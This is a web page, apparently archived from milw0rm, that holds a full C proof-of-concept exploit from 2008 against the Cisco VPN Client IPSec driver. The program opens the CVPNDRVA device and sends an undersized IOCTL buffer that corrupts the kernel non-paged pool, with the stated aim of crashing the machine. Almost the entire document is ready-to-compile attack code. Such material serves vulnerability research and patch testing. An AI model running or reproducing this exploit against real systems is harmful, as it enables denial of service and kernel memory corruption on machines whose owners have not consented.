<html><head><title>Cisco VPN Client IPSec Driver Local kernel system pool Corruption PoC</title></head><pre>/* cpndrv-dos.c
 *
 * Copyright (c) 2008 by &lt;mu-b@digit-labs.org&gt;
 *
 * Cisco Systems VPN Client IPSec Driver local kernel system pool corruption POC
 * by mu-b - Sat 11 Jan 2008
 *
 * - Tested on: CVPNDRVA.sys 5.0.02.0090
 *
 * specifying an input buffer size less-than 8+31-bytes results in the
 * local kernel non-paged pool (METHOD_BUFFERED) being corrupted with
 * uninitialised (dangling) kernel stack memory via an inline memcpy.
 *
 * Compile: MinGW + -lntdll
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;windows.h&gt;
#include &lt;ddk/ntapi.h&gt;

#define CVPN_IOCTL    0x80002038
#define CVPN_LEN      0x10       /* n &lt; 8 + 31 */

struct ioctl_req {
  char arg[CVPN_LEN];
};

int
main (int argc, char **argv)
{
  struct ioctl_req req;
  HANDLE hFile;
  BOOL result;
  DWORD rlen;

  printf (&quot;Cisco VPN Client IPSec Driver local kernel system pool corruption PoC\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot;
          &quot;http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n&quot;);

  hFile = CreateFileA (&quot;\\\\.\\CVPNDRVA&quot;, FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, &quot;* CreateFileA failed, %d\n&quot;, hFile);
      exit (EXIT_FAILURE);
    }

  memset (&amp;req, 0x00, sizeof req);
  req.arg[0] = 0x69;

  /* corrupt the system pool */
  printf (&quot;* hitting.. [sizeof: %d]\n&quot;, sizeof req);
  Sleep (5000);

  result = DeviceIoControl (hFile, CVPN_IOCTL,
                            &amp;req, sizeof req, &amp;req, sizeof req, &amp;rlen, 0);
  if (!result)
    {
      fprintf (stderr, &quot;* DeviceIoControl failed\n&quot;);
      exit (EXIT_FAILURE);
    }
  printf (&quot;done\n\n&quot;
          &quot;* hmmm, you didn't STOP the box?!?!\n&quot;);

  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2008-01-15]</pre></html>